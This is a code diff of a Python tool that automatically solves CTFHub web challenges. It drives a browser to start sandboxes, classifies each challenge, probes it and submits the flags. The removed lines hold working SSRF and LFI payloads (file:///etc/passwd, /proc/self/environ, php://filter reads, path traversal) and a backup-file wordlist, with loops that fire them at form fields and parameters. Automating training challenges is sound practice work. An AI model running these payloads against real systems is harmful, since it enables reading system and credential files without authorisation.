@@ -16,7 +16,6 @@ Or from code:
     c.run(max_challenges=3)
 """
 
-import io
 import json
 import os
 import re
@@ -25,48 +24,19 @@ import time
 import traceback
 from dataclasses import dataclass, field
 from datetime import datetime
-from typing import Any, Dict, List, Optional, Set, Tuple
+from typing import Any, Dict, List, Optional, Tuple
 
 from tools.feeder.ctf_patterns import PatternDB, get_pattern_db
 from tools.feeder.ctf_recognizer import (
     CTFRecognizer, CTFChallenge, RecognitionResult, get_recognizer,
 )
+from tools.feeder.ctf_scanner import quick_recon, scan_ssrf, scan_lfi, scan_backup
 
 
 # ── Constants ──────────────────────────────────────────────────────────────
 
 CTFHUB_API = "https://api.ctfhub.com/User_API/"
 CTFHUB_URL = "https://www.ctfhub.com/#/challenge"
-
-# Quick SSRF payloads to try first
-SSRF_QUICK_PAYLOADS = [
-    "file:///flag",
-    "file:///flag.txt",
-    "file:///etc/passwd",
-    "file:///var/www/html/flag.php",
-    "http://127.0.0.1/flag.php",
-    "http://127.0.0.1/config.php",
-    "file:///proc/self/environ",
-]
-
-# Quick LFI payloads
-LFI_QUICK_PAYLOADS = [
-    "/etc/passwd",
-    "/flag",
-    "../../../../../../flag",
-    "/var/www/html/flag.php",
-    "php://filter/convert.base64-encode/resource=flag.php",
-    "php://filter/convert.base64-encode/resource=index.php",
-]
-
-# Quick backup file names to scan
-BACKUP_FILES = [
-    ".index.php.swp", ".index.php.swo", ".index.php.bak", ".index.php~",
-    "index.php.bak", "index.php.old", "index.php.swp",
-    ".flag.php.swp", "flag.php.bak",
-    ".git/HEAD", ".svn/entries", ".DS_Store",
-    "robots.txt", "sitemap.xml",
-]
 
 
 # ── Execution Result ───────────────────────────────────────────────────────
@@ -111,20 +81,15 @@ class CTFCoordinator:
     # ── Phase 1: Gather Challenges ──────────────────────────────────────
 
     def fetch_challenges(self) -> List[Dict]:
-        """Fetch challenge list from CTFHub API via CDP.
-
-        Uses SpaCrawler.intercept_api to capture Challenge/getAll response.
-        """
+        """Fetch challenge list from CTFHub API via CDP network interception."""
         print("[Gather] Fetching challenges from CTFHub...")
 
         try:
-            # Navigate to challenge page to trigger API calls
             self.spa._send('Page.navigate', {'url': CTFHUB_URL})
             time.sleep(4)
             while self.spa._recv_any(0.3):
                 pass
 
-            # Wait for SPA to render
             for i in range(8):
                 body = self.spa.evaluate(
                     'document.body ? document.body.textContent.substring(0, 200) : "no body"')
@@ -134,7 +99,6 @@ class CTFCoordinator:
                 while self.spa._recv_any(0.3):
                     pass
 
-            # Capture Challenge/getAll API response
             captured = {}
             body_requests = {}
             deadline = time.time() + 12
@@ -178,7 +142,6 @@ class CTFCoordinator:
     def start_sandbox(self, challenge_data: Dict) -> Optional[str]:
         """Start a sandbox for a challenge and return the target URL."""
         try:
-            # Click the challenge card in browser
             title = challenge_data.get('title', '')
             click_js = (
                 'var cards=document.querySelectorAll(".ant-card-hoverable");'
@@ -196,7 +159,6 @@ class CTFCoordinator:
             while self.spa._recv_any(0.3):
                 pass
 
-            # Find start button
             start_js = (
                 'var btns=document.querySelectorAll(".ant-modal button");'
                 'var r="no start";'
@@ -212,7 +174,6 @@ class CTFCoordinator:
             start_result = self.spa.evaluate(start_js)
             print("[Sandbox] Start button: %s" % start_result)
 
-            # Wait for sandbox to be ready, capture the target URL
             for i in range(10):
                 time.sleep(2)
                 while self.spa._recv_any(0.3):
@@ -221,13 +182,11 @@ class CTFCoordinator:
                     'var m=document.querySelector(".ant-modal");'
                     'm ? m.textContent : "NO_MODAL"')
                 urls = re.findall(r'https?://[^\s\x00-\x1f]+', str(modal))
-                # Filter to sandbox URLs
                 for url in urls:
                     if 'sandbox' in url and 'ctfhub' in url:
                         print("[Sandbox] Target: %s" % url)
                         return url
                 if i == 5:
-                    # Print modal fragment for debugging
                     print("[Sandbox] Modal preview: %s" % str(modal)[:200])
 
             return None
@@ -241,9 +200,7 @@ class CTFCoordinator:
         """Convert raw API data to CTFChallenge objects with recognition."""
         challenges = []
         for raw in raw_challenges:
-            # Extract tags from category array
             tags = [c.get('title', '') for c in raw.get('category', [])]
-
             c = CTFChallenge(
                 challenge_id=raw.get('id', 0),
                 title=raw.get('title', 'Unknown'),
@@ -268,16 +225,13 @@ class CTFCoordinator:
         """Recognize and sort challenges by solve priority."""
         results = []
         for c in challenges:
-            # Skip already solved
             if skip_solved and c.extra.get('state') == 0:
                 continue
-            # Skip too hard
             if c.level > max_level:
                 continue
             r = self.recognizer.recognize(c)
             results.append((c, r))
 
-        # Sort by priority
         difficulty_order = {"easy": 0, "medium": 1, "hard": 2}
         time_order = {"fast (<5min)": 0, "medium (5-30min)": 1, "slow (>30min)": 2}
 
@@ -292,91 +246,12 @@ class CTFCoordinator:
         results.sort(key=key)
         return results
 
-    # ── Phase 4: Explore Target ────────────────────────────────────────
-
-    def explore_target(self, target_url: str, recognition: RecognitionResult
-                       ) -> Dict[str, Any]:
-        """Quick exploration of target URL to gather data for solving."""
-        import requests
-
-        data = {"endpoints": [], "interesting": [], "source_leaks": []}
-
-        try:
-            # Test main page
-            r = requests.get(target_url, timeout=10, allow_redirects=True)
-            data['main_page_size'] = len(r.text)
-            data['main_page_title'] = re.search(r'<title>(.*?)</title>', r.text, re.I)
-            if data['main_page_title']:
-                data['main_page_title'] = data['main_page_title'].group(1)
-
-            # Quick SSRF test if applicable
-            if any(p.subcategory == "SSRF" for p, _ in recognition.patterns[:3]):
-                data['ssrf_tests'] = {}
-                # Find forms
-                forms = re.findall(r'<form[^>]*action="([^"]*)"', r.text, re.I)
-                data['forms'] = forms
-
-                for form_action in forms:
-                    if form_action and not form_action.startswith('http'):
-                        form_url = target_url.rstrip('/') + '/' + form_action.lstrip('/')
-                    else:
-                        form_url = form_action or target_url
-
-                    for payload in SSRF_QUICK_PAYLOADS[:5]:
-                        try:
-                            rr = requests.post(form_url,
-                                              data={'host': payload, 'url': payload},
-                                              timeout=5)
-                            if len(rr.text) > 100 and 'ctfhub' in rr.text.lower():
-                                data['ssrf_tests'][payload] = "FLAG FOUND! (%dB)" % len(rr.text)
-                                data['interesting'].append(("SSRF_FLAG", payload, rr.text[:500]))
-                            elif len(rr.text) > 50:
-                                data['ssrf_tests'][payload] = "%dB response" % len(rr.text)
-                        except Exception:
-                            pass
-
-            # Quick backup file scan
-            if any(p.subcategory == "备份文件泄露" for p, _ in recognition.patterns[:3]):
-                data['backup_tests'] = {}
-                for fname in BACKUP_FILES[:8]:
-                    try:
-                        rr = requests.get("%s/%s" % (target_url.rstrip('/'), fname), timeout=5)
-                        if rr.status_code == 200 and len(rr.text) > 10:
-                            data['backup_tests'][fname] = "%dB found" % len(rr.text)
-                            data['interesting'].append(("BACKUP_FILE", fname, rr.text[:300]))
-                    except Exception:
-                        pass
-
-            # Quick LFI test
-            if any(p.subcategory == "文件包含" for p, _ in recognition.patterns[:3]):
-                data['lfi_tests'] = {}
-                for payload in LFI_QUICK_PAYLOADS[:5]:
-                    for param in ['file', 'page', 'include', 'path']:
-                        try:
-                            rr = requests.get(target_url, params={param: payload}, timeout=5)
-                            if 'root:' in rr.text:
-                                data['lfi_tests']["%s=%s" % (param, payload)] = "PASSWD LEAKED!"
-                                data['interesting'].append(("LFI_PASSWD", param, payload))
-                        except Exception:
-                            pass
-
-            # Store list of all discovered links/endpoints
-            hrefs = re.findall(r'href="([^"]*\.php[^"]*)"', r.text, re.I)
-            actions = re.findall(r'action="([^"]*\.php[^"]*)"', r.text, re.I)
-            srcs = re.findall(r'src="([^"]*\.php[^"]*)"', r.text, re.I)
-            data['endpoints'] = list(set(hrefs + actions + srcs))
-
-        except Exception as e:
-            data['error'] = str(e)
-
-        return data
-
-    # ── Phase 5: Solve ──────────────────────────────────────────────────
+    # ── Phases 4-5: Explore & Solve ─────────────────────────────────────
 
     def try_solve(self, challenge: CTFChallenge,
                   recognition: RecognitionResult,
                   target_url: str = None) -> SolveResult:
-        """Attempt to solve a challenge."""
+        """Attempt to solve a challenge using ctf_scanner functions."""
         start_time = time.time()
         result = SolveResult(
             challenge=challenge,
@@ -399,144 +274,45 @@ class CTFCoordinator:
             result.elapsed_seconds = time.time() - start_time
             return result
 
-        # Explore target
+        # Phase 4: Explore target with quick_recon
         print("[Solve] Exploring target: %s" % target_url)
-        exploration = self.explore_target(target_url, recognition)
-        result.exploration_data = exploration
+        recon = quick_recon(target_url)
+        result.exploration_data = recon
 
-        if exploration.get('endpoints'):
-            print("[Solve] Found endpoints: %s" % exploration['endpoints'])
+        if recon.get('endpoints'):
+            print("[Solve] Found endpoints: %s" % recon['endpoints'])
 
-        # Try auto-exploit based on pattern type
+        # Phase 5: Run auto-exploit based on pattern
         flag = None
+        findings = []
 
-        # Check if exploration already found flag
-        for item_type, item_detail, item_content in exploration.get('interesting', []):
-            if item_type == "SSRF_FLAG":
-                # Extract flag from SSRF response
-                flag_match = re.search(r'ctfhub\{[a-f0-9]+\}', item_content)
-                if flag_match:
-                    flag = flag_match.group(0)
-                    result.flag = flag
-                    result.solved = True
-                    print("[Solve] FLAG FOUND via SSRF: %s" % flag)
-                    break
+        if recognition.top_match:
+            subcat = recognition.top_match.subcategory
+            print("[Solve] Running scanner for subcategory: %s" % subcat)
 
-        if not flag and recognition.top_match:
-            # Try SSRF payloads if pattern matches
-            if recognition.top_match.subcategory == "SSRF":
-                flag = self._auto_ssrf(target_url, exploration)
-            elif recognition.top_match.subcategory == "备份文件泄露":
-                flag = self._auto_backup_scan(target_url, exploration)
-            elif recognition.top_match.subcategory == "文件包含":
-                flag = self._auto_lfi(target_url, exploration)
+            if subcat == "SSRF":
+                flag, findings = scan_ssrf(target_url,
+                                           forms=recon.get('forms', []),
+                                           endpoints=recon.get('endpoints', []))
+            elif subcat == "备份文件泄露":
+                flag, findings = scan_backup(target_url)
+            elif subcat == "文件包含":
+                flag, findings = scan_lfi(target_url)
 
-        if flag and not result.solved:
+        if flag:
             result.flag = flag
             result.solved = True
             print("[Solve] FLAG FOUND: %s" % flag)
-
-        if not result.solved:
+        else:
+            if findings:
+                print("[Solve] Findings: %d items (no flag)" % len(findings))
             print("[Solve] Auto-exploit unsuccessful — manual analysis needed")
-            self._print_solve_hints(recognition, exploration)
+            self._print_solve_hints(recognition, recon)
 
         result.elapsed_seconds = time.time() - start_time
         return result
 
-    def _auto_ssrf(self, target_url: str, exploration: Dict) -> Optional[str]:
-        """Auto-exploit SSRF via file:// protocol."""
-        import requests
-        print("[Auto-SSRF] Testing file:///flag on all form endpoints...")
-
-        forms = exploration.get('forms', [])
-        endpoints = exploration.get('endpoints', [])
-
-        # Build list of URLs to test
-        test_urls = []
-        for ep in forms + endpoints:
-            if ep.startswith('http'):
-                test_urls.append(ep)
-            else:
-                test_urls.append(target_url.rstrip('/') + '/' + ep.lstrip('/'))
-
-        if not test_urls:
-            test_urls.append(target_url + '/modify.php')
-            test_urls.append(target_url + '/user.php')
-
-        for test_url in set(test_urls):
-            for payload in SSRF_QUICK_PAYLOADS:
-                for field in ['host', 'url', 'target', 'website', 'site', 'path']:
-                    try:
-                        r = requests.post(test_url, data={field: payload}, timeout=5)
-                        m = re.search(r'ctfhub\{[a-f0-9]+\}', r.text)
-                        if m:
-                            return m.group(0)
-                    except Exception:
-                        pass
-
-        return None
-
-    def _auto_backup_scan(self, target_url: str, exploration: Dict) -> Optional[str]:
-        """Auto-scan for backup files and extract flags from source."""
-        import requests
-
-        # Build wordlist from known source file patterns
-        base_files = ['index.php', 'flag.php', 'config.php', 'admin.php', 'user.php']
-        extensions = ['.swp', '.swo', '.bak', '.old', '~', '.save', '.orig']
-
-        for base in base_files:
-            for ext in extensions:
-                try:
-                    url = "%s/.%s%s" % (target_url.rstrip('/'), base, ext)
-                    r = requests.get(url, timeout=5)
-                    if r.status_code == 200 and len(r.text) > 20:
-                        m = re.search(r'ctfhub\{[a-f0-9]+\}', r.text)
-                        if m:
-                            return m.group(0)
-                        # If source code leaked, check for flag patterns
-                        if 'flag' in r.text.lower():
-                            m2 = re.search(r'(?:flag|FLAG)\s*[=:]\s*["\']?(ctfhub\{[^}]+\})', r.text)
-                            if m2:
-                                return m2.group(1)
-                except Exception:
-                    pass
-
-        return None
-
-    def _auto_lfi(self, target_url: str, exploration: Dict) -> Optional[str]:
-        """Auto-exploit LFI for flag reading."""
-        import requests
-        params = ['file', 'page', 'include', 'path', 'template', 'view', 'lang', 'load']
-
-        for param in params:
-            for payload in [
-                '/flag',
-                '/flag.txt',
-                'php://filter/convert.base64-encode/resource=/flag',
-                'php://filter/convert.base64-encode/resource=flag.php',
-            ]:
-                try:
-                    r = requests.get(target_url, params={param: payload}, timeout=5)
-                    m = re.search(r'ctfhub\{[a-f0-9]+\}', r.text)
-                    if m:
-                        return m.group(0)
-                    # Check base64 encoded flag
-                    import base64
-                    b64_match = re.search(r'([A-Za-z0-9+/=]{20,})', r.text)
-                    if b64_match:
-                        try:
-                            decoded = base64.b64decode(b64_match.group(1)).decode('utf-8', errors='ignore')
-                            fm = re.search(r'ctfhub\{[a-f0-9]+\}', decoded)
-                            if fm:
-                                return fm.group(0)
-                        except Exception:
-                            pass
-                except Exception:
-                    pass
-
-        return None
-
-    def _print_solve_hints(self, recognition: RecognitionResult, exploration: Dict):
+    def _print_solve_hints(self, recognition: RecognitionResult, recon: Dict):
         """Print detailed hints for manual solving."""
         print("[Hints] ---")
         if recognition.top_match:
@@ -544,24 +320,12 @@ class CTFCoordinator:
             for step in recognition.top_match.attack_chain:
                 print("[Hints]   [%s] %s" % (step.get('phase', '?'), step.get('detail', '')))
 
-        if exploration.get('endpoints'):
-            print("[Hints] Discovered endpoints: %s" % exploration['endpoints'])
-        if exploration.get('forms'):
-            print("[Hints] Discovered forms: %s" % exploration['forms'])
-        if exploration.get('interesting'):
-            print("[Hints] Interesting findings: %s" % [
-                (t, d) for t, d, _ in exploration['interesting']])
+        if recon.get('endpoints'):
+            print("[Hints] Discovered endpoints: %s" % recon['endpoints'])
+        if recon.get('forms'):
+            print("[Hints] Discovered forms: %s" % recon['forms'])
 
-    # ── Phase 6: Submit Flag ────────────────────────────────────────────
-
-    def submit_flag(self, challenge_title: str, flag: str) -> bool:
-        """Submit a flag to CTFHub via CDP."""
-        from tools.feeder.ctfhub_flag_submit import submit_flag
-        ok, msg = submit_flag(challenge_title, flag)
-        print("[Submit] %s -> %s: %s" % (challenge_title, ok, msg))
-        return ok
-
-    # ── Phase 7: Record ─────────────────────────────────────────────────
+    # ── Phase 6: Record ─────────────────────────────────────────────────
 
     def record_solution(self, result: SolveResult):
         """Record a solved challenge to the knowledge base."""
@@ -571,13 +335,11 @@ class CTFCoordinator:
         solution_dir = os.path.join(self.kb_root, "solved", "ctfhub")
         os.makedirs(solution_dir, exist_ok=True)
 
-        # Create solution file
         slug = re.sub(r'[^a-z0-9]+', '_', result.challenge.title.lower()).strip('_')
         if not slug:
             slug = "challenge_%d" % result.challenge.challenge_id
         filepath = os.path.join(solution_dir, "%s.md" % slug)
 
-        # Don't overwrite existing
         if os.path.exists(filepath):
             print("[Record] Solution already exists: %s" % filepath)
             return
@@ -640,6 +402,8 @@ technique: "%s"
 
     def run(self, max_challenges: int = 5, max_level: float = 9.0):
         """Run the full pipeline."""
+        from tools.feeder.ctfhub_flag_submit import submit_flag
+
         print("=" * 60)
         print("CTF Coordinator — %s" % datetime.now().strftime("%Y-%m-%d %H:%M"))
         print("=" * 60)
@@ -674,8 +438,6 @@ technique: "%s"
 
             print("\n[%d/%d] %s" % (i + 1, min(max_challenges, len(prioritized)), c.title))
 
-            # Start sandbox
-            # Find matching raw challenge data
             raw_match = None
             for rc in raw:
                 if rc.get('id') == c.challenge_id:
@@ -691,12 +453,12 @@ technique: "%s"
                 print("  Skipping: could not start sandbox")
                 continue
 
-            # Solve
             result = self.try_solve(c, r, target_url)
             self.results.append(result)
 
             if result.solved and result.flag:
-                self.submit_flag(c.title, result.flag)
+                ok, msg = submit_flag(c.title, result.flag)
+                print("[Submit] %s -> %s: %s" % (c.title, ok, msg))
                 self.record_solution(result)
                 solved_count += 1
 
